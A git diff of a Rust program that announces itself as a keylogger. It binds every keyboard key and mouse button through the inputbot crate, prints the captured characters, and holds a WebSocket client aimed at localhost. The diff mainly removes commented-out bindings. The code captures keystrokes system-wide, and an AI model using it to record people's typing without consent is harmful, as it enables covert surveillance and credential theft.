@@ -4,9 +4,6 @@ use std::io::prelude::*;
 use tungstenite::{connect, Message};
 use url::Url;
 
-use device_query::{DeviceQuery, DeviceState, MouseState, Keycode};
-
-
 const WS_ADDRESS:&str = "ws://localhost:8765";
 
 fn passthrough_key(event: &str) {
@@ -37,71 +34,26 @@ fn ws_client(event: &str) {
 fn main() {
     println!("Keylogger Running");
     keyboard_input();
-
-
-    // let device_state = DeviceState::new();
-    // let mouse: MouseState = device_state.get_mouse();
-    // println!("Current Mouse Coordinates: {:?}", mouse.coords);
-    // let keys: Vec<Keycode> = device_state.get_keys();
-    // println!("Is A pressed? {}", keys.contains(&Keycode::A));
-    // loop {
-    //     let keys: Vec<Keycode> = device_state.get_keys();
-    //     println!("{:?}", keys);
-    //     println!("Is A pressed? {}", keys.contains(&Keycode::A));
-    // }
-
 }
 
 fn keyboard_input() {
-    // AKey.bind(|| { passthrough_key("a") });
-    // BKey.bind(|| { passthrough_key("b") });
-    // CKey.bind(|| { passthrough_key("c") });
-    // DKey.bind(|| { passthrough_key("d") });
-    // EKey.bind(|| { passthrough_key("e") });
-    // FKey.bind(|| { passthrough_key("f") });
-    // GKey.bind(|| { passthrough_key("g") });
-    // HKey.bind(|| { passthrough_key("h") });
-    // IKey.bind(|| { passthrough_key("i") });
-    // JKey.bind(|| { passthrough_key("j") });
-    // KKey.bind(|| { passthrough_key("k") });
-    // LKey.bind(|| { passthrough_key("l") });
-    // MKey.bind(|| { passthrough_key("m") });
-    // NKey.bind(|| { passthrough_key("n") });
-    // OKey.bind(|| { passthrough_key("o") });
-    // PKey.bind(|| { passthrough_key("p") });
-    // QKey.bind(|| { passthrough_key("q") });
-    // RKey.bind(|| { passthrough_key("r") });
-    // SKey.bind(|| { passthrough_key("s") });
-    // TKey.bind(|| { passthrough_key("t") });
-    // UKey.bind(|| { passthrough_key("u") });
-    // VKey.bind(|| { passthrough_key("v") });
-    // WKey.bind(|| { passthrough_key("w") });
-    // XKey.bind(|| { passthrough_key("x") });
-    // YKey.bind(|| { passthrough_key("y") });
-    // ZKey.bind(|| { passthrough_key("z") });
-
-    // EnterKey.bind(|| { passthrough_key("\n") });
-    // SpaceKey.bind(|| { passthrough_key(" ") });
-
-    // AKey.bind(|| { println!("a") });
-    // let a: i32 = 0x032;
-    // let b: u64 = a as u64;
-    // OtherKey(b).bind(|| { println!("Z") });
-    // OtherKey(0x041).bind(|| { println!("TEST") });
-
     KeybdKey::bind_all(|event| {
-        println!("{:?}", event);
+        let mut c_action = ' ';
         match inputbot::from_keybd_key(event) {
-            Some(c) => println!("{c}"),
-            None => println!("Unregistered Key"),
+            Some(c) => { 
+                c_action = c;
+            },
+            None => {println!("{:?}", event)},
         };
+        println!("{:?}", &c_action);
     });
+
+
 
     // Bind all mouse buttons to a common callback event.
     MouseButton::bind_all(|event| {
         println!("{:?}", event);
     });
-
 
     handle_input_events();
 }
